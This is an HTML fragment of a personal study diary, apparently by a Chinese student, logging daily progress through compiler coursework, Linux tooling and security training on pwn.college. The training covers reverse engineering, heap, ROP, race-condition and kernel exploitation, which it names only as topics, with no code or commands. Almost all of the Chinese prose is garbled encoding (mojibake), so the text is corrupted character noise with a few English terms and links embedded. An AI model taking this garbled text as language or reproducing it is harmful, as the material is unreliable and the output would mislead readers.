å»æ‰å¥½åƒä¹Ÿæ²¡äº‹. clangåˆ°åº•æ˜¯å‰ç«¯è¿˜æ˜¯ç¼–è¯‘é©±åŠ¨å•Š? </li><li>å–æ¶ˆwindowsé˜²ç«å¢™é˜»æŒ¡ICMPæŠ¥æ–‡. <a href="https://superuser.com/questions/1412029/traceroute-shows-just-in-linux-in-a-virtual-machine-although-displays">link</a> </li></ul></li><li>12: å¼€å·.<ul><li>æ•´äº†ä¸ª<strong>zsh</strong>. <a href="https://seamatinee.com/2021/09/23/ubuntu-customization/#Terminal-%E7%BE%8E%E5%8C%96">link</a> | C++ä½œè€…<a href="https://www.stroustrup.com/C++.html">ç½‘ç«™</a> | RTTI, æ²¡çœ‹æ‡‚ | first classä¹Ÿæ²¡çœ‹æ‡‚ | <a href="https://www.doxygen.nl/index.html">doxygen</a>æ˜¯ä¸ªå•¥ | clashæ·»åŠ è§„åˆ™</li><li>è¿˜åœ¨Assignment1, æŠŠLLVMçš„ä¸œè¥¿çœ‹ä¸€éå“ªæœ‰è¿™ä¹ˆå¿«å•Š.</li></ul></li><li>13: åˆçœ‹äº†ä¸€å¤©çš„æ–‡æ¡£+è¡¥æ‰è¯¾å†…çš„æ— èŠä½œä¸š. æŠŠLLVMè®¾è®¡ç»“æ„çœ‹äº†ä¸ªå¤§æ¦‚, æœ‰ç‚¹é€šé€çš„æ„Ÿè§‰äº†(</li></ul><h3 id="ç¬¬ä¸‰åå…­å‘¨-3-14-3-20"><a href="#ç¬¬ä¸‰åå…­å‘¨-3-14-3-20" class="headerlink" title="ç¬¬ä¸‰åå…­å‘¨: 3/14-3/20"></a>ç¬¬ä¸‰åå…­å‘¨: 3/14-3/20</h3><ul><li>14: æ€ä¹ˆè¿˜åœ¨çœ‹æ–‡æ¡£. å¼„äº†vscodeç¼–è¾‘, çº¯vimçœŸæ˜¯æ¥å—ä¸èƒ½. wocå¥½åƒå¿«ä¸‰å‘¨äº†, æˆ‘è¿˜æ²¡æå®Œ, è¿˜æœ‰makefileå’Œcmakeçš„è¯­æ³•æ²¡çœ‹å‘¢.</li><li>15: <a href="https://en.wikipedia.org/wiki/User_space_and_kernel_space#USERLAND">userland</a>(user space) | <a href="https://en.wikipedia.org/wiki/FreeBSD">FreeBSD</a> | <a href="https://en.wikipedia.org/wiki/Copyleft">copyleft</a>,<a href="https://en.wikipedia.org/wiki/GNU_General_Public_License">GPL</a> | Ninja | <ul><li>çœ‹äº†cmake&amp;&amp;make&amp;&amp;C++è™šç»§æ‰¿. ç„¶åå¼€å§‹å†™ä»£ç .</li></ul></li><li>16:  static member functions(<a href="https://stackoverflow.com/questions/2315166/where-would-you-use-a-friend-function-vs-a-static-member-function">stackover</a> &amp; <a href="https://en.cppreference.com/w/cpp/language/static">cppref</a>) | <ul><li><code>replaceAllUsesWith()</code>è¿™ä¸ªå‡½æ•°æˆ‘çœ‹äº†åŠå¤©, stackoverflowæŸ¥äº†æŸ¥llvmæ–‡æ¡£åˆçœ‹äº†çœ‹, è¿˜å»doxygençœ‹æºç , ç»ˆäºçœ‹æ‡‚llvmæ˜¯æ€ä¹ˆç»„ç»‡è¿™ä¸€å¯¹å…³ç³»çš„äº†. å…·ä½“åœ¨CSCD70ç¬”è®°é‡Œ.</li></ul></li><li>17: ç»§ç»­cmakeå’ŒAssignment2.<ul><li>æœåˆ°ä¸€ç¯‡å¥½æ–‡, vimçš„çª—å£ä½¿ç”¨, <a href="https://linuxhint.com/opening_switching_multiple_files_vim/">here</a> </li></ul></li><li>18-20: pwn.college</li></ul><h3 id="ç¬¬ä¸‰åä¸ƒå‘¨-3-21-3-27"><a href="#ç¬¬ä¸‰åä¸ƒå‘¨-3-21-3-27" class="headerlink" title="ç¬¬ä¸‰åä¸ƒå‘¨: 3/21-3/27"></a>ç¬¬ä¸‰åä¸ƒå‘¨: 3/21-3/27</h3><ul><li>21-23: capstone engine(ä¸€ä¸ªåæ±‡ç¼–å¼•æ“) | <a href="https://www.geeksforgeeks.org/difference-between-fork-and-vfork/">vfork&amp;fork</a> <ul><li>pwn.college.</li></ul></li><li>24: <a href="https://en.wikipedia.org/wiki/Concolic_testing">concolic execution</a> | <a href="https://en.wikipedia.org/wiki/Symbolic_execution">Symbolic execution</a> | <p hidden>å°ç­çœŸæŠ˜ç£¨, <strong>æ°´å¹³å·®å¤ªå¤š</strong>æœ‰ç‚¹æ— æ³•æ²Ÿé€šçš„æ„Ÿè§‰, æˆ‘ä¹¦éƒ½çœ‹å®Œäº†ä»–ä»¬æ‰åˆšå¼€å§‹â€¦.</p> </li><li>25-26: å°æ ¡, è®¡ç½‘å°ç­, æ— äº†</li><li>27: windowsç½‘å¡å¿…é¡»æ˜¯è‹±æ–‡åæ‰èƒ½ä»£ç† | <a href="https://en.wikipedia.org/wiki/POSIX">POSIX</a> å’Œ System Vçš„linuxç³»ç»Ÿè°ƒç”¨<a href="https://blog.csdn.net/return_cc/article/details/78417642">å…³ç³»</a>| <ul><li>pwn.college</li></ul></li></ul><h3 id="ç¬¬ä¸‰åå…«å‘¨-3-28-4-3"><a href="#ç¬¬ä¸‰åå…«å‘¨-3-28-4-3" class="headerlink" title="ç¬¬ä¸‰åå…«å‘¨: 3/28-4/3"></a>ç¬¬ä¸‰åå…«å‘¨: 3/28-4/3</h3><ul><li>28-29: ç–«æƒ…ç–«æƒ…ç–«æƒ…  pwncollege | discordâ€™s direct message (DM) | <a href="https://tanqisen.github.io/blog/2013/01/13/vim-search-replace-regex/">vim regex</a> | <a href="https://en.wikipedia.org/wiki/Binary_File_Descriptor_library">BFD</a> &amp; objdump+readelf<br><a href="https://docs.kernel.org/filesystems/proc.html">/proc(kernel doc)</a> | <a href="https://floatingoctothorpe.uk/2017/dumping-memory-with-gdb.html">dumping memory with gdb</a> | <p hidden>å¤ä¹ äº†ä¸€ä¸‹mallocä»¥åŠgdbä¸­çš„æ“ä½œ, å› ä¸ºæ‰§è¡Œç¯å¢ƒçš„åŸå› ä¹‹å‰çš„å †é¢˜æˆ‘éƒ½æ²¡æœ‰ä½¿ç”¨è¿‡gdbæ¥è°ƒè¯•, ä»Šå¤©è¶ç€å°ç­è¯¾ä¸€å¼„ç´¯å¾—åŠæ­», ä¸€ä¼šå„¿å¯¹é½æ²¡ææ˜ç™½, ä¸€ä¼šå„¿å°ç«¯æ³•æ²¡çœ‹å‡ºæ¥, åˆä¸€å›å„¿è¢«æŒ‡é’ˆå¼„æ™•(æŠŠæŒ‡å‘å †çš„æŒ‡é’ˆèµ‹å€¼ä¸ºåªè¯»data, è¿˜åœ¨é‚£å„¿æƒ³ä¸ºä»€ä¹ˆp1ä¸åœ¨mapsé‡Œçš„heapæ®µä¸­???? çœŸç»äº†, ä¸è¿‡å¤ä¹ äº†ä¸€ç‚¹ç‚¹ç‚¹ç‚¹malloc, ç†Ÿæ‚‰äº†ä¸€ä¸‹gdbçš„æ“ä½œ.</p></li><li>30: <a href="https://luomuxiaoxiao.com/?p=516">elfå¯åŠ¨æµç¨‹</a>(æ˜¯æ—¶å€™çœ‹çœ‹ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»äº†) | <p hidden>å°ç­è¯¾åˆæ ½è¿›å»å‡ ä¸ªå°æ—¶, å¥½å¿ƒå½•ä¸ªè§†é¢‘å¸Œæœ›æ›´å¤šäººèƒ½çœ‹è§å§.</p> </li><li>31-1: <p hidden>å•Šè¿™, ä¸€ä¸ªå°ç­è¯¾ä¸ŠåˆåŸºæœ¬å°±æ²¡äº†, ç„¶åä¸‹åˆè°ƒäº†ä¸‹mykeymap, æ™šä¸Šçœ‹äº†çœ‹æ—¥è¯­å’Œå•è¯, çœ‹äº†çœ‹bomblab, ä¸€å¤©æ²¡äº†â€¦â€¦</p>bashçš„<a href="https://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html">manual</a>å¯ä»¥ä¸€çœ‹ | <ul><li>çœ‹sandboxingçš„è§†é¢‘, çœ‹äº†ä¸¤éæ„Ÿè§‰ç»†èŠ‚è¿˜æ˜¯å¾ˆå¤š. å°±åƒæˆ‘å°ç­è¯¾ä¸Šå’Œåˆ«äººè®²é¢˜ç›®, ä¸€äº›å°æ“ä½œæˆ‘éƒ½æ²¡æœ‰å»è§£é‡Š, ç¬¬ä¸€æ¬¡è§è‚¯å®šä¼šè§‰å¾—ä¿¡æ¯é‡è¿‡å¤§.</li></ul></li><li>2: <a href="https://unix.stackexchange.com/questions/4126/what-is-the-exact-difference-between-a-terminal-a-shell-a-tty-and-a-con">tty terminal shellâ€¦</a>&amp;<a href="https://askubuntu.com/questions/14284/why-is-a-virtual-terminal-virtual-and-what-why-where-is-the-real-terminal">short explain</a>&amp;<a href="https://en.wikipedia.org/wiki/Computer_terminal">computer terminal</a> | pwn.college-babyjail.<ul><li>terminalåœ¨ä»¥å‰æ˜¯ä¸€å°å®é™…çš„è®¾å¤‡, åœ¨ä»Šå¤©çš„å›¾å½¢åŒ–ç•Œé¢ç³»ç»Ÿä¸­æ›´å¤šä½¿ç”¨çš„æ˜¯terminal emulator, è€Œä¸éœ€è¦ä¸€å°çœŸå®çš„terminal.</li><li><strong>tty</strong>â€“teletype(writer): accessing the computer by sending keystrokes to it and receiving output back from it, printing it to a piece of paper.</li><li>gnome-terminal and konsole are themselves <strong>running on a tty</strong>, åŒ…æ‹¬graphical subsystem.</li><li>ä¸ºä»€ä¹ˆåœ¨termnal emulatorsé‡Œèƒ½ä½¿ç”¨^H(å°±æ˜¯backspace)è¿™æ ·çš„<a href="https://en.wikipedia.org/wiki/ANSI_escape_code">ANSI escape code</a>? å› ä¸ºå°½ç®¡hardware text terminals have become increasingly rare in the 21st century, the relevance of the ANSI standard persists because a great majority of terminal emulators and command consoles interpret at least a portion of the ANSI standard.</li><li>ç›´æ¥çœ‹kpçš„<a href="https://kiprey.github.io/2021/10/kernel_pwn_introduction/#1-%E7%BB%88%E7%AB%AF%E8%AE%BE%E5%A4%87%E7%B1%BB%E5%9E%8B%E7%AE%80%E4%BB%8B">ç»ˆç«¯è®¾å¤‡ç±»å‹ç®€ä»‹</a> </li></ul></li><li>3: babyjail | gccç¼–è¯‘é€‰é¡¹:<code>-masm=intel</code>gdbé€‰é¡¹:<code>set disassembly-flavor intel</code> | æ‰¾åˆ°äº†æ‰€æœ‰çš„è§†é¢‘</li></ul><h3 id="ç¬¬ä¸‰åä¹å‘¨-4-4-4-10"><a href="#ç¬¬ä¸‰åä¹å‘¨-4-4-4-10" class="headerlink" title="ç¬¬ä¸‰åä¹å‘¨: 4/4-4/10"></a>ç¬¬ä¸‰åä¹å‘¨: 4/4-4/10</h3><ul><li>4: <a href="https://stackoverflow.com/questions/2529185/what-are-cfi-directives-in-gnu-assembler-gas-used-for">CFI directives</a>&amp;<a href="https://stackoverflow.com/questions/38552116/how-to-remove-noise-from-gcc-clang-assembly-output">complier option</a> | çœ‹è§†é¢‘ä¸­, æ²¡æ‰¾åˆ°æƒ³è¦çš„</li><li>5: <a href="https://www.baeldung.com/linux/posix">guide to POSIX</a>&amp;<a href="https://pubs.opengroup.org/onlinepubs/9699919799/nframe.html">full doc</a> | pwn.babyjail to 10 | <a href="https://unix.stackexchange.com/questions/515881/what-does-the-ep-capability-mean">StackOverflowä¸Šçš„capability(ies)</a>, manä¸Šä¹Ÿæœ‰, æ˜¯chrootæƒé™çš„èƒŒååŸå›  </li><li>6-7: bashçš„æ‰‹å†Œä¹Ÿå¾—çœ‹ä¸‹, æ“ä½œå¥½å¤š, ä¸»è¦æ˜¯shellè¯­è¨€çš„è§„åˆ™. ç¬¬äºŒå¤©bomblabé‡åš(32ä½çš„â€¦â€¦.)</li><li>8-10:  gdb refresher</li></ul><h3 id="ç¬¬å››åå‘¨-4-11-4-17"><a href="#ç¬¬å››åå‘¨-4-11-4-17" class="headerlink" title="ç¬¬å››åå‘¨: 4/11-4/17"></a>ç¬¬å››åå‘¨: 4/11-4/17</h3><ul><li>11: æ²¡åšå•¥</li><li>12 13: <a href="https://unix.stackexchange.com/questions/6155/can-i-easily-search-my-history-across-many-screen-windows">history in screen</a> | makeçš„è¯­æ³•ä¹Ÿå¤ªå¤šäº†â€¦â€¦.è¦å¯¹æ–‡æ¡£PTSDäº† | 13çœ‹äº†ç‚¹è®¡ç½‘å°ç­.æµªè´¹æ—¶é—´çš„ä¸œè¥¿.</li><li>14: reverse engineeringâ€¦. æˆ‘çœŸçš„è®¤çœŸçš„åªçœ‹æ±‡ç¼–, ä½†æ˜¯ä¸€æƒ³ä¹Ÿæ²¡å¿…è¦, éƒ½ç”¨IDA proäº†. ç„¶åä¸‹è½½äº†pwnsh, åŠ ä¸Šä¸‰ä¸ªgdbæ’ä»¶å®‰è£…è„šæœ¬, å†ç†Ÿæ‚‰äº†ä¸€ä¸‹IDAçš„ç•Œé¢, ç„¶åå†™ä¸ªpythonè„šæœ¬ä¸œæŸ¥æŸ¥è¥¿æŸ¥æŸ¥(list comprehension), æœ€åçœ‹äº†çœ‹è§†é¢‘, çŸ¥é“äº†gdbè°ƒè¯•set-uidçš„ç¨‹åºä¸èƒ½æˆåŠŸderandomizeä»¥åŠIDAæ·»åŠ structç±»å‹ç­‰ç­‰æ¥å®Œå–„decompiled code, ç”¨äº†<strong>æ•´ä¸ª</strong>ä¸‹åˆå’Œæ™šä¸Š. å¥½åƒæ˜¯å­¦äº†ç‚¹ä¸œè¥¿â€¦..</li><li>15-17: reverse !<br>IDAçš„<a href="https://eviatargerzi.medium.com/remote-debugging-with-ida-from-windows-to-linux-4a98d7095215">è¿œç¨‹gdb</a> | pluginlist(ä¸€æ—¶åŠä¼šå„¿ç”¨ä¸åˆ°,å…ˆstar)</li></ul><h3 id="ç¬¬å››åä¸€-äºŒå‘¨-4-18-5-1"><a href="#ç¬¬å››åä¸€-äºŒå‘¨-4-18-5-1" class="headerlink" title="ç¬¬å››åä¸€/äºŒå‘¨: 4/18-5/1"></a>ç¬¬å››åä¸€/äºŒå‘¨: 4/18-5/1</h3><ul><li>18æ»¡è¯¾(â€¦)19åšäº†ä¸€ç‚¹20-22<u>IDA debug</u>| reverse engineering</li><li>23: memory error, å¼„äº†pwndbgçš„å¤šè§†å›¾å’Œtmux. æ¯”screenå¥½ç”¨, è¿˜èƒ½æ•´é¼ æ ‡(</li><li>26: ç»§ç»­memory error, 7åšåˆ°12</li><li>27: è§†é¢‘é‡ŒçœŸæœ‰ä¸€äº›æ²¡è§è¿‡çš„ç”¨æ³•â€¦.è¦ä¸è¦èŠ±æ—¶é—´çœ‹å‘¢?</li><li>å‰©ä¸‹å‡ å¤©åšåˆ°äº†exploitationçš„ç¬¬7é¢˜. </li></ul><h3 id="ç¬¬å››åäºŒå‘¨-5-2-5-8"><a href="#ç¬¬å››åäºŒå‘¨-5-2-5-8" class="headerlink" title="ç¬¬å››åäºŒå‘¨: 5/2-5/8"></a>ç¬¬å››åäºŒå‘¨: 5/2-5/8</h3><ul><li>3: expçš„ç¬¬ä¸ƒé¢˜å¼€å§‹Yan85, å›é¡¾äº†ä¸€ä¸‹revçš„18+19.</li><li>4-5: è¿‡äº†ä¸€émem, çœ‹äº†ropè§†é¢‘, åœ¨æ•´heap.</li><li>6-7: åœ¨æ•´rop. è¿˜æ˜¯æœ‰ä»¥å‰é‚£å‡ é“ctfé¢˜é‡Œæ²¡è§è¿‡çš„ä¸œè¥¿, æ¯•ç«Ÿè¿™è¯¾ç¨‹ä¼šæ›´ç³»ç»Ÿä¸€ç‚¹.<br><a href="https://bbs.pediy.com/thread-254868-1.htm">ä¸åŒç‰ˆæœ¬libcä½¿ç”¨</a> | </li><li>8:rop. æ‰“ç®—çœ‹ä¸¤çœ¼ROPgadgetçš„å®ç°, äº†è§£ä¸€ä¸‹pythoné¡¹ç›®. <ul><li>è¯•äº†ä¸‹gdbçš„recordå’Œreverse exec.</li></ul></li></ul><h3 id="ç¬¬å››åä¸‰å‘¨-5-9-5-15"><a href="#ç¬¬å››åä¸‰å‘¨-5-9-5-15" class="headerlink" title="ç¬¬å››åä¸‰å‘¨: 5/9-5/15"></a>ç¬¬å››åä¸‰å‘¨: 5/9-5/15</h3><ul><li>9-10: rop</li><li>11-12: race condition</li><li>13: race + è¡¥ä¸€ä¸‹<strong>shell programming</strong>(è¯¦è§linuxä½¿ç”¨), éƒ½æŸ¥åˆ°äº†POSIXçš„æ ‡å‡†äº†.</li><li>14-15: race, level1æµ‹è¯•+shellç¼–å†™, ç»“æœlevel5ç›´æ¥å¡ä½è¿‡ä¸äº†. ä¸‹å‘¨çœ‹è§†é¢‘å»äº†.<ul><li>â€¦â€¦â€¦â€¦â€¦â€¦â€¦.æ„Ÿè§‰è¿˜æ˜¯å¾—ç”¨python, æ²¡æœ‰ç”¨shellçš„. osæ¨¡å—æŒºå¤šå‡½æ•°. ä¸è¿‡shellçœ‹äº†ä¸‹ä¹Ÿä¸äº(å¤§æ¦‚)</li></ul></li></ul><h3 id="ç¬¬å››åå››å‘¨-5-16-5-22"><a href="#ç¬¬å››åå››å‘¨-5-16-5-22" class="headerlink" title="ç¬¬å››åå››å‘¨: 5/16-5/22"></a>ç¬¬å››åå››å‘¨: 5/16-5/22</h3><ul><li>16-17: raceåˆ°8, 17å·çœ‹office hourä¸­çš„level8 socket, æ„Ÿè§‰å‰é¢çš„socketç›¸å…³éƒ½è·³è¿‡äº†ä¸å¤ªå¥½â€¦..</li><li>18: å†™äº†pythonçš„å¹¶è¡Œ. vimå®‰è£…äº†ç‚¹æ’ä»¶.</li><li>19: ç»§ç»­race | pthreadé” |  awkè¯­è¨€<ul><li>åˆä¸æ˜æ‰€ä»¥åœ°åšå®Œäº†level9, level10ä¸€ä¸ªç»•è¿‡semaphoreåˆæ•´ä¸ä¼šäº†, çœ‹è§†é¢‘å»äº†.</li></ul></li><li>20: raceå®Œæˆ+kernelä¸€ç‚¹è§†é¢‘</li><li>21: LibcSearcherå’ŒpythonåŒ…å®‰è£…æ›´æ–°,æ•´ç†rootæ–‡ä»¶å¤¹ | pwn_kernelç¯å¢ƒæ­å»º+è§†é¢‘ | çœ‹linux inside syscall part1 | </li><li>22: pwnkernel, å†…å®¹å¾ˆå¤š.<br><a href="https://www.kernel.org/doc/man-pages/">online manpage</a> | </li></ul><h3 id="ç¬¬å››åäº”å‘¨-5-23-5-29"><a href="#ç¬¬å››åäº”å‘¨-5-23-5-29" class="headerlink" title="ç¬¬å››åäº”å‘¨: 5/23-5/29"></a>ç¬¬å››åäº”å‘¨: 5/23-5/29</h3><ul><li>23: kernel vedio + online challenge usage</li><li>24: kernel challenge to 6(half complete)</li><li>25: Computer Network Lab5: root dns server on local machine. + è®¡ç³»å°ç­</li><li>26-27: kernelå¤§æ¦‚åšå®Œäº† | äº†è§£ä¸€ä¸‹CTFtimeä¸Šçš„ä¸œè¥¿.</li><li>28: æ„šè ¢çš„éªŒæ”¶æµªè´¹ä¸€å¤©æ—¶é—´. æœ¬ç§‘åƒæ˜¯ä¸ªç¬‘è¯</li><li>29: advanced, vedio+note.</li></ul><h3 id="ç¬¬å››åå…­å‘¨-5-30-6-5"><a href="#ç¬¬å››åå…­å‘¨-5-30-6-5" class="headerlink" title="ç¬¬å››åå…­å‘¨: 5/30-6/5"></a>ç¬¬å››åå…­å‘¨: 5/30-6/5</h3><ul><li>30: <p hidden>æˆ‘ç„¯,  æ”¹å˜ç­–ç•¥, å…¨åŠ›ä¿ç ”, å±…ç„¶èƒ½åœ¨åˆ†æµåä¿ç ”è¾¹ç¼˜, é©¬ä¸Šå¼€å§‹å†…å·.</p> </li><li>31-5: å¤ä¹ +ä¸€ç‚¹ç‚¹advance.</li></ul><h3 id="ç¬¬å››åä¸ƒå‘¨-6-6-6-12"><a href="#ç¬¬å››åä¸ƒå‘¨-6-6-6-12" class="headerlink" title="ç¬¬å››åä¸ƒå‘¨: 6/6-6/12"></a>ç¬¬å››åä¸ƒå‘¨: 6/6-6/12</h3><ul><li>6-7: å¤ä¹ å‘¨.</li></ul><h2 id="å¼€å§‹æš‘å‡"><a href="#å¼€å§‹æš‘å‡" class="headerlink" title="å¼€å§‹æš‘å‡"></a>å¼€å§‹æš‘å‡</h2><p>é‡æ–°è®¡æ•°, å› ä¸ºå¤§äºŒç»“æŸäº†(å°å­¦æœŸä¸æ˜¯ä¸ªä¸œè¥¿, æ‰€ä»¥ä¸ç®—)</p><h3 id="ç¬¬ä¸€å‘¨-6-13-6-19"><a href="#ç¬¬ä¸€å‘¨-6-13-6-19" class="headerlink" title="ç¬¬ä¸€å‘¨: 6/13-6/19"></a>ç¬¬ä¸€å‘¨: 6/13-6/19</h3><ul><li>13-16: æœŸæœ«è€ƒè¯•</li><li>17: é‡æ–°çœ‹æœ€åä¸€ç« </li><li>18: å‘ç°ä»£ç ä¸­è¿˜æ˜¯æœ‰å¾ˆå¤šç»†èŠ‚, ä»”ç»†åˆ†æè§†é¢‘ä¸­, å¹¶ä¸”å¯¹ä»£ç åšäº†ä¸€ç‚¹å°ä¿®æ”¹.</li><li>19: åœ¨kali2021ä¸Šçš„libc2.33ä¸­(æ¯”2.31å¤šäº†tcacheå¯¹é½æ£€æŸ¥å’Œåœ°å€ä¿æŠ¤)å®ç°äº†ä»»æ„è¯»å†™åŸè¯­æ„é€ , å®Œå…¨ç†è§£äº†ç¤ºä¾‹ä»£ç ä¸­çš„æ¯ä¸€è¡Œçš„æ“ä½œ. ä¸è¿‡åœ¨context.binaryå¿˜åŠ ä¸Šè¿™é‡Œå¡äº†æŒºä¹…â€¦â€¦.ä»ç„¶åœ¨level1.<br>scanf å’Œ printf çš„ç©ºå­—èŠ‚è¯»å†™é—®é¢˜ | tcache poisoning.</li></ul><h3 id="ç¬¬äºŒå‘¨-6-20-6-26"><a href="#ç¬¬äºŒå‘¨-6-20-6-26" class="headerlink" title="ç¬¬äºŒå‘¨: 6/20-6/26"></a>ç¬¬äºŒå‘¨: 6/20-6/26</h3><ul><li>20-23: ä¸€äº›advanceå’Œå°å­¦æœŸ.</li><li>24-26: ç®—æ˜¯å­¦å®Œäº†pwn.college, ç„¶åæ•´ç‚¹å•ç‰‡æœºç¼–ç¨‹, å†ç„¶åå¼€æ•´CTF</li></ul><h3 id="ç¬¬ä¸‰å‘¨-6-27-7-3"><a href="#ç¬¬ä¸‰å‘¨-6-27-7-3" class="headerlink" title="ç¬¬ä¸‰å‘¨: 6/27-7/3"></a>ç¬¬ä¸‰å‘¨: 6/27-7/3</h3><ul><li>27-3: å•ç‰‡æœºç¼–ç¨‹ + gitçš„è¿›é˜¶ä½¿ç”¨(vscode GitLen+ Git CLI)<br>å†™ä»£ç æœ‰ç‚¹ä¸Šå¤´, xywæ•´äº†ä¸ªç¦»è°±ç©æ„å„¿æˆ‘æ‰“ç®—è¿™ä¸¤å¤©çœ‹çœ‹.</li></ul><h3 id="ç¬¬å››å‘¨-7-4-7-10"><a href="#ç¬¬å››å‘¨-7-4-7-10" class="headerlink" title="ç¬¬å››å‘¨: 7/4-7/10"></a>ç¬¬å››å‘¨: 7/4-7/10</h3><ul><li>4-6: å®Œå–„å€’è®¡æ—¶å•ç‰‡æœº, é¡ºå¸¦ç†Ÿæ‚‰äº†ä¸€ä¸‹gitçš„å„ç§åŠŸèƒ½.</li><li>7: dockeråœ¨ubuntuä¸Šçš„å®‰è£…ä½¿ç”¨(æœ€åä¹Ÿæ²¡æ•´æˆ, Desktopè£…ä¸ä¸Šæˆ–è€…è®¾ç½®æ‰“ä¸å¼€, è¿˜æ˜¯æ”¾å¼ƒäº†.)<br><a href="https://www.redhat.com/en/topics/api/what-is-a-rest-api">RESTful API</a> | è£…äº†ä¸ªUbuntu22.04 | åŒç³»ç»Ÿæ•´ä¸æ˜ç™½,ä¸è£…äº†<br>æ˜å¤©ç»§ç»­dockerå‘½ä»¤ç†Ÿæ‚‰(æ²¡äº†å›¾å½¢ç•Œé¢åªèƒ½ç»§ç»­å­¦å‘½ä»¤è¡Œäº†)</li><li>å…¶ä½™: docker compose syntax | xinetd(which means deamon) | <code>.d</code>directory name |<br>Firmware, a special class of computer software used to control low-level hardware(like BIOS), held in non-volatile mem |<br>å‡çº§äº†ä¸€ä¸‹è™šæ‹Ÿæœºç¡¬ä»¶å…¼å®¹æ€§, ç°åœ¨kaliæ”¯æŒäº†KVM |  </li></ul><h3 id="ç¬¬äº”å‘¨-7-11-7-17"><a href="#ç¬¬äº”å‘¨-7-11-7-17" class="headerlink" title="ç¬¬äº”å‘¨: 7/11-7/17"></a>ç¬¬äº”å‘¨: 7/11-7/17</h3><ul><li>11: åˆå¾€å•ç‰‡æœºç¼–ç¨‹é¡¹ç›®é‡ŒåŠ äº†ç‚¹ä¸œè¥¿, å€’è®¡æ—¶æ›´å®Œå–„(<del>å¤§æ‚çƒ©</del>)äº†</li><li>12: kernel module programming | device.héƒ½ä¸çŸ¥é“åœ¨å“ªé‡Œ,æœéƒ½æœä¸åˆ°å“ªé‡Œä¸‹è½½ | </li><li>13: ç»§ç»­ | çœ‹äº†xywçš„STC-OS | </li><li>14: å¼„æ˜ç™½90%çš„STC-OS | vim | CTF-WiKi in kernel</li><li>15: kernel | ???</li><li>16: kernel ROP(ç¯å¢ƒéƒ¨åˆ†) é‡åˆ°äº†ä¸€ç‚¹é—®é¢˜, ä¸¤ä¸ªå°æ—¶è§£å†³äº†.</li><li>17: ç»§ç»­ROP(ä»£ç éƒ¨åˆ†) ä¿®æ”¹pythonåº“ä»£ç <a href="https://stackoverflow.com/questions/72659999">é”™è¯¯</a> </li></ul><h3 id="ç¬¬å…­å‘¨-7-18-7-24"><a href="#ç¬¬å…­å‘¨-7-18-7-24" class="headerlink" title="ç¬¬å…­å‘¨: 7/18-7/24"></a>ç¬¬å…­å‘¨: 7/18-7/24</h3><ul><li>18: ret2userä»£ç , <p hidden>å›é¾™å²©ä¸€è¶Ÿ, æ²¡å­¦å¤šå°‘.<p> </li><li>19: strtol()åˆ°ç±»å‹æŒ‡å®šé•¿åº¦å°±ä¼šåœä¸‹ | è°ƒè¯•</li><li>20: ç»§ç»­WiKi | MSRå’Œgs/fsç›¸å…³å†…å®¹, å†™åœ¨new_starté‡Œé¢ | </li><li>21: ç”¨<code>svn checkout [/trunk]</code>ä¸‹è½½ç›¸åº”å­æ–‡ä»¶å¤¹ | ç»§ç»­bypass smep | æŠŠextractç§»åŠ¨åˆ°binä¸‹</li><li>22: æŸ¥Intelæ‰‹å†Œ, Double fetch</li><li>23: fetch + userfaultfd, çœ‹äº†åŠå¤©çš„constgrepæºç , å±…ç„¶åªæ˜¯ç¡¬ç¼–ç çš„å®å®šä¹‰. è¿˜æ˜¯ç”¨lookup_constantsäº†.<p hidden>é¥¥è’+Clannad</p> </li><li>24: ????????????????????????????<p hidden>å…¨æ˜¯é¥¥è’</p> </li></ul><h3 id="ç¬¬ä¸ƒå‘¨-7-25-7-31"><a href="#ç¬¬ä¸ƒå‘¨-7-25-7-31" class="headerlink" title="ç¬¬ä¸ƒå‘¨: 7/25-7/31"></a>ç¬¬ä¸ƒå‘¨: 7/25-7/31</h3><ul><li>25: æ¶‰åŠåˆ°å†…æ ¸çš„macroå¥½éš¾æŸ¥å‡ºæ¥ | userfaultfd | </li><li>26: kernel æ”¶å°¾ | IO_FILE </li><li>28:  å¤ä¹ å †åˆ©ç”¨çš„å„ç§æŠ€å·§. </li><li>29: <div hidden>æ²¡å¾—å­¦äº†â€¦..é—®skrå»äº† | å¼€äº†ä¸€å¤©è½¦</div> â€¦</li><li>30: å¤ä¹ heapåˆ©ç”¨.</li><li>31: ç»§ç»­ | <a href="https://refspecs.linuxfoundation.org/">linux specifications</a> | <a href="https://refspecs.linuxfoundation.org/lsb.shtml">LSB standard</a> | HOOK</li></ul><h3 id="ç¬¬å…«å‘¨-8-1-8-7"><a href="#ç¬¬å…«å‘¨-8-1-8-7" class="headerlink" title="ç¬¬å…«å‘¨: 8/1-8/7"></a>ç¬¬å…«å‘¨: 8/1-8/7</h3><ul><li>1: libcå¤šç‰ˆæœ¬(ä½¿ç”¨glibc-all-in-one) | æ·»åŠ äº†chlibcåˆ°/binä¸­.</li><li>2-3: large bin attack | Tcache</li><li>7: heap</li></ul><h3 id="ç¬¬ä¹-åå‘¨-8-8-8-21"><a href="#ç¬¬ä¹-åå‘¨-8-8-8-21" class="headerlink" title="ç¬¬ä¹/åå‘¨: 8/8-8/21"></a>ç¬¬ä¹/åå‘¨: 8/8-8/21</h3><ul><li>8: off-one-byte </li><li>9-10: b00ks</li><li>15: ç»ˆäºçœ‹å®Œäº†heapstrom2. </li><li>18: pylance <a href="https://stackoverflow.com/questions/65252074#answer-67070096">æ·»åŠ </a>importè·¯å¾„ </li><li>19: çœ‹ret2dlresolve</li></ul><h3 id="ç¬¬åä¸€å‘¨-8-22-8-28"><a href="#ç¬¬åä¸€å‘¨-8-22-8-28" class="headerlink" title="ç¬¬åä¸€å‘¨: 8/22-8/28"></a>ç¬¬åä¸€å‘¨: 8/22-8/28</h3><ul><li>21: å°å­¦æœŸæŠ¥å‘Š</li><li>22-26: å°å­¦æœŸ+ret2dlresolve+é“¾æ¥è£…è½½ä¸åº“</li><li>27-28: 32ä½</li></ul><h3 id="ç¬¬åäºŒå‘¨-8-29-9-4"><a href="#ç¬¬åäºŒå‘¨-8-29-9-4" class="headerlink" title="ç¬¬åäºŒå‘¨: 8/29-9/4"></a>ç¬¬åäºŒå‘¨: 8/29-9/4</h3><ul><li>29-30: æ•´ç†å…³äºELFåŠ¨æ€é“¾æ¥çš„çŸ¥è¯†ç‚¹</li><li>31-1: ç»§ç»­æ•´ç†åŠ ä¸Š32ä½æƒ…å†µä¸‹çš„expçš„å†™</li><li>2: 32ä½partialçš„exp</li></ul><h2 